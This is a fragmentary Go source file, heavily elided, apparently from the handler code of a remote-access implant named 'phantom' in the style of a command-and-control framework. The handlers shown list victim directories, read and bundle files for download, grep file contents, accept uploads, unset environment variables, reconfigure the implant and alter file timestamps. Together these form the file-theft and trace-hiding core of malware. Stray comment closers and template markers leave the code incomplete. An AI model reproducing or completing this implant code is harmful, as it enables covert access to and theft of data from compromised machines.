...
import (
	...
	"github.com/cryptdefender3232/phantom/implant/phantom/handlers/matcher"
...
type TunnelHandler func(*phantompb.Envelope, *transports.Connection)
...
func dirListHandler(data []byte, resp RPCResponse) {
	...
	dirList := &phantompb.Ls{Path: dir, Timezone: timezone, TimezoneOffset: int32(offset)}
	if err == nil {
		dirList.Exists = true
	} else {
	...
	dirList.Files = []*phantompb.FileInfo{}
	...
	if err == nil && rootDirInfo != nil && filter == "" {
		...
		dirList.Files = append(dirList.Files, &phantompb.FileInfo{
	...
	for _, dirEntry := range files {
		...
		if match {
			...
			phantomFileInfo := &phantompb.FileInfo{}
			if err == nil {
				phantomFileInfo.Size = fileInfo.Size()
				phantomFileInfo.ModTime = fileInfo.ModTime().Unix()
				...
				*/
				phantomFileInfo.Mode = fileInfo.Mode().String()
				...
				phantomFileInfo.Uid = getUid(fileInfo)
				phantomFileInfo.Gid = getGid(fileInfo)
			}

			phantomFileInfo.Name = dirEntry.Name()
			phantomFileInfo.IsDir = dirEntry.IsDir()
			phantomFileInfo.Link = linkPath

			dirList.Files = append(dirList.Files, phantomFileInfo)
		}
	}
...
func readMultipleFiles(path string, filter string, recurse bool) *phantompb.Download {
	var downloadData bytes.Buffer
	var downloadResponse *phantompb.Download = &phantompb.Download{
		Path:            path + filter,
		Exists:          true,
		IsDir:           true,
		ReadFiles:       0,
...
func prepareDownload(path string, filter string, recurse bool, restrictedToFiles bool, maxBytes int64, maxLines int64) *phantompb.Download {
	var err error
	// Default response
	var downloadResponse *phantompb.Download = &phantompb.Download{
		Path:            path + filter,
...
func downloadHandler(data []byte, resp RPCResponse) {
	var download *phantompb.Download

	downloadReq := &phantompb.DownloadReq{}
	...
	if pathIsDirectory(target) {
		...
		if downloadReq.RestrictedToFile {
			...
			*/
			...
			// {{end}}
			download = &phantompb.Download{Path: target, Exists: false, ReadFiles: 0, UnreadableFiles: 0}
...
func searchFileForPattern(searchPath string, searchPattern *regexp.Regexp, linesBeforeCount int, linesAfterCount int) ([]*phantompb.GrepResult, bool, error) {
	var results []*phantompb.GrepResult
	...
	for fileScanner.Scan() {
		...
		if matches := searchPattern.FindAllStringIndex(line, -1); matches != nil {
			if !textLine {
				results = append(results, &phantompb.GrepResult{LineNumber: linePosition})
			} else {
				var positions []*phantompb.GrepLinePosition
				for _, match := range matches {
					positions = append(positions, &phantompb.GrepLinePosition{Start: int32(match[0]), End: int32(match[1])})
				}
				if linesBeforeCount > 0 && len(linesBefore) > 0 {
					results = append(results, &phantompb.GrepResult{LineNumber: linePosition, Positions: positions, Line: line, LinesBefore: linesBefore[:len(linesBefore)-1]})
				} else {
					results = append(results, &phantompb.GrepResult{LineNumber: linePosition, Positions: positions, Line: line, LinesBefore: []string{}})
				}
...
func searchPathForPattern(searchPath string, filter string, searchPattern *regexp.Regexp, recursive bool, linesBefore int, linesAfter int) (map[string]*phantompb.GrepResultsForFile, error) {
	var results map[string]*phantompb.GrepResultsForFile = make(map[string]*phantompb.GrepResultsForFile)
	...
	for _, file := range fileList {
		...
		if err != nil {
			...
			result := &phantompb.GrepResult{LineNumber: -1, Positions: nil, Line: err.Error()}
			results[file] = &phantompb.GrepResultsForFile{FileResults: []*phantompb.GrepResult{result}, IsBinary: binaryFile}
			continue
		} else {
			results[file] = &phantompb.GrepResultsForFile{FileResults: fileResults, IsBinary: binaryFile}
		}
	}
...
func performGrep(searchPath string, searchPattern *regexp.Regexp, recursive bool, linesBefore int, linesAfter int) (map[string]*phantompb.GrepResultsForFile, error) {
	var results map[string]*phantompb.GrepResultsForFile
	...
	if err == nil && !fileInfo.IsDir() {
		...
		results = make(map[string]*phantompb.GrepResultsForFile)
		results[target] = &phantompb.GrepResultsForFile{FileResults: result, IsBinary: binaryFile}
		return results, nil
...
func grepHandler(data []byte, resp RPCResponse) {
	...
	grep := &phantompb.Grep{Results: nil}
...
func uploadHandler(data []byte, resp RPCResponse) {
	...
	// Process Upload
	upload := &phantompb.Upload{Path: uploadPath}
...
func unsetEnvHandler(data []byte, resp RPCResponse) {
	...
	unsetEnvResp := &phantompb.UnsetEnv{
		Response: &commonpb.Response{},
	}
	if err != nil {
...
func reconfigureHandler(data []byte, resp RPCResponse) {
	reconfigReq := &phantompb.ReconfigureReq{}
	...
	reconfigResp := &phantompb.Reconfigure{}
...
func chtimesHandler(data []byte, resp RPCResponse) {
	chtimesReq := &phantompb.ChtimesReq{}
